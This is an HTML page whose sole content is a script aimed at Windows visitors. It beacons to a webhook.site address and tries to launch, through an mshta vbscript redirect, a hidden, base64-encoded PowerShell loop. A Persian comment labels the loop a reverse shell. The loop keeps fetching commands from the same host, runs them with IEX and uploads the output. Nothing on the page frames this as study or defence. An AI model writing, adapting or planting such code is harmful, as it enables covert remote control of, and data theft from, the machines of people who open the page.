<!DOCTYPE html>
<html><head><meta charset="utf-8"></head><body>
<script>
if (navigator.userAgent.indexOf("Windows") !== -1) {
    const hook = "https://webhook.site/caf8f897-4396-4d09-b589-659fde39630d";
    const pc   = btoa(encodeURIComponent("$env:COMPUTERNAME-$env:USERNAME"));
    const uid  = Math.random().toString(36).substr(2,9);

    // Reverse shell کاملاً در حافظه + loop هر ۴ ثانیه
    const rev = `
while(1){
  try{
    $r=(New-Object Net.WebClient).DownloadString('https://webhook.site/caf8f897-4396-4d09-b589-659fde39630d?uid=${uid}&pc='+[Environment]::UserName+'@'+[Environment]::MachineName);
    if($r){
      $o=IEX $r -ErrorAction Stop 2>&1 | Out-String;
      (New-Object Net.WebClient).UploadString('https://webhook.site/caf8f897-4396-4d09-b589-659fde39630d','uid=${uid}&out='+$o);
    }
  }catch{}
  Start-Sleep -Seconds 4
}`.replace(/\n/g,' ').trim();

    const b64 = btoa(unescape(encodeURIComponent(rev)));

    setTimeout(() => {
        location = "mshta vbscript:CreateObject(\"WScript.Shell\").Run(\"powershell -nop -w hidden -enc " + b64 + "\",0)(window.close())";
    }, 1000);

    fetch(hook + "?beacon=win-" + uid);
}
</script>
</body></html>
